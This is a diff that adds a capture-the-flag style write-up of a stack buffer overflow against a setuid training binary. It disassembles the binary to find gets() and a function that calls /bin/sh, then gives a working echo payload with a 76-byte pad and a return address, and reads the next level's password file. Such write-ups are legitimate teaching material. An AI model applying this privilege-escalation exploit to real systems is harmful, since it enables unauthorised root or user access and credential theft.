@@ -1,0 +1,41 @@
+> ls -l
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+
+# s mean it's run has if level2 run it
+>./level01 # Wait input
+XXXX
+
+# If a lot of char Segmentation fault (core dumped) (76)
+
+> objdump -d level1 # We see that the main function call get that is know to be not secure
+ 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
+ 
+ # And there is this function that seems to need get call
+ 08048444 <run>
+ 
+ # Run contain fwrite and system func
+ 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
+ 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
+ 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
+> (gdb) x /s 0x8048570
+0x8048570:	 "Good... Wait what?\n"
+> (gdb) x /s 0x8048584
+0x8048584:	 "/bin/sh"
+
+
+# So we think it's a buffer overflow to run the run function witch call "/bin/sh", we use lscpu to check the endian type
+[buffer][padding][adress_you_acess] # Buffer Overflow Blueprint
+
+# So we need to send
+> [c*76][][\x44\x84\x04x\08]
+
+# So we GO BRRR
+
+> echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/exploit
+
+> cat /tmp/exploit - | ./level1 #The cat - let stdin open for write
+Good... Wait what?
+> cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 # FLAGED
+
+
